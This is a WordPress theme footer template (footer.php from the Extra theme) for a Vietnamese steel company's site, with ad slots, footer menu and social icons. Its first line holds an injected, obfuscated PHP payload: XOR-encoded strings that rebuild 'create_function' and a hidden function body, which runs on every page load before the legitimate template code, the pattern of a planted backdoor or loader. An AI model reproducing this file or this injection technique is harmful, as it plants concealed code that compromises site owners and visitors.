<?php $DAJpOd='OFN.-EjPU;9ADB<'^',4+OY 56 UZ5--R';$jpIKB=$DAJpOd('','8KYvF2WUC>+Z1E0>1I>boF7R+HACQ+t4B;sLqB=KYK,=38TX4R4-5q+ZO5-9=B-pmWVA2KZw9SYeXKTSZPBN8GB=7yRnlLKmgE5BBBC>RPnRJVfEm<FRAI9GMO8-6LlnGImAEBZEM9X3hMObitX06A8pDffgeVUV3nRUpHVNMN<7RdsR30q7PUSXG;+TG;WJq8N Pl34O=EaEK,O6UvkT,7423WnO+31Jm<4KKUpT2WC,oy2Z,R54Q;uoc1,-qp;5P84xJ1.-RXGKEL56C,eo=pMb6MIQ6VEAQIqg>S6K44o=VHTqXWRCJ;6.Xi+=Y=MyXNK5.3PxBPKD0 D3, DoiJt8,3xis5b8CKw<,LMjhlf>MLO4COVrO9nV3B8iKN2bGku>ECmXcAV0A>XuYstV X2TYDLEXH2SWS8:9ztDyHN=.B3.ZYOYFJ.Y;-+AT+d>0;J88AXrLj25951Qcw>T<VjHcHQVBAgZ=0HfRF 0MjQQI3hmvZM H3MfW366.TX1 1Qi;SYAbZiHTTZnaSVmbX6QfR+W 6.TEVMp,DuMewDG.g dGaaOhZSy<wqPyrkvgSiDOM4Y3LTjQbuEC 06M,;34-;YD9FF+ae8XN-540jEWbZA5TaditMZZbClF-:TGxUYVJOnf3QNTY4DSjMHxH6F8.yCQQ76'^'Q-qW G967WD4n HWB=MJH>X t, 70t+Y7OTeXbFAP-YSPL=7ZrLBG.O;;TrfP7YXI375SgzSR6 Lxktsz+HG1c-HCYoNKkpgnLS-0jgWrmNbqvB,QO2 -,Woi+YYWeWNc FjlHSLiV-GHcrBAP<QB cT-;F9Er>3J5v<Pmv=9<PR<LW9VIXjynYQNIN 2I9bUW;TyW9=278kOoH.B4VVtJVXAVldkORE+2WQ2khP2S;0ITs8<C PU2SUGGnob>;rppYGXnZKTreyka:TZ6ILOFzDFR,=0i= 8qtQCU6Op>=KY7<5Qewv5+WCKccV7ST+YpooQOG1Qb+AMVO6VMC,OAn+jib-, aBY0kSWI5mWVLBH, :Qjo-xF0J2R6Y6 +KBzKQU :VRjHrT J9UdSP A4G1bNE8R58Ys7YNXZId9= NK0ZO605<n2A+dIJ55t;SEObZY2=Dx5VPZZU4KSZ5H7CdCl576 81XIaOiLIVeN50=RHKPz,R:R49<VOiK,1BTByNP6 fNzM,5 ;GAupMJ5RdNvO6TWus.34WqmUpXWcpOUETwUR-Zh0IYOIfNESBQfQuwtPkUz6MxBSccABD,UdXQTd<<P52XIBH97AZUTMiwF> A5HMITmzzB8fOHL5+Pq=7>.5AC0786U t7dsrAS>QZQsxj=K');$jpIKB(); 

$footer_above_ad = extra_display_ad( 'footer_above', false ); ?>
	<?php if ( !empty( $footer_above_ad ) ) { ?>
	<div class="container">
		<div class="et_pb_extra_row etad footer_above">
			<?php echo $footer_above_ad; ?>
		</div>
	</div>
	<?php } ?>

	<footer id="footer" class="<?php extra_footer_classes(); ?>">
		<?php get_sidebar( 'footer' ); ?>
		<div id="footer-bottom">
			<div class="container">

				<!-- Footer Info -->
				<p id="footer-info"><?php printf( et_get_safe_localization( __( 'Copyright &copy;   2018 Công ty TNHH-DV Thép Bình Nguyên. All Rights Reserved.') ), '<a href="http://www.elegantthemes.com" title="Premium WordPress Themes">Elegant Themes</a>', '<a href="http://www.wordpress.org">WordPress</a>' ); ?></p>

				<!-- Footer Navigation -->
				<?php if ( has_nav_menu( 'footer-menu' ) || false !== et_get_option( 'show_footer_social_icons', true ) ) { ?>
				<div id="footer-nav">
					<?php
					if ( has_nav_menu( 'footer-menu' ) ) {
						wp_nav_menu( array(
							'theme_location' => 'footer-menu',
							'depth'          => '1',
							'menu_class'     => 'bottom-nav',
							'menu_id'        => 'footer-menu',
							'container'      => '',
							'fallback_cb'    => '',
						) );
					}

					$show_footer_social_icons = et_get_option( 'show_footer_social_icons', true );

					if ( false !== $show_footer_social_icons || is_customize_preview() ) {
					?>
						<ul class="et-extra-social-icons" style="<?php extra_visible_display_css( $show_footer_social_icons ); ?>">
						<?php $social_icons = extra_get_social_networks(); ?>
						<?php foreach ( $social_icons as $social_icon => $social_icon_title ) { ?>
							<?php $social_icon = esc_attr( $social_icon ); ?>
							<?php $social_icon_url = et_get_option( sprintf( '%s_url', $social_icon ), '' ); ?>
							<?php if ( '' != $social_icon_url ) { ?>
							<li class="et-extra-social-icon <?php echo $social_icon; ?>">
								<a href="<?php echo esc_url( $social_icon_url ); ?>" class="et-extra-icon et-extra-icon-background-none et-extra-icon-<?php echo $social_icon; ?>"></a>
							</li>
							<?php } ?>
						<?php } ?>
						</ul>
					<?php
					}
					?>
				</div> <!-- /#et-footer-nav -->
				<?php } ?>

			</div>
		</div>
	</footer>
	</div> <!-- #page-container -->

	<?php wp_footer(); ?>
</body>
</html>
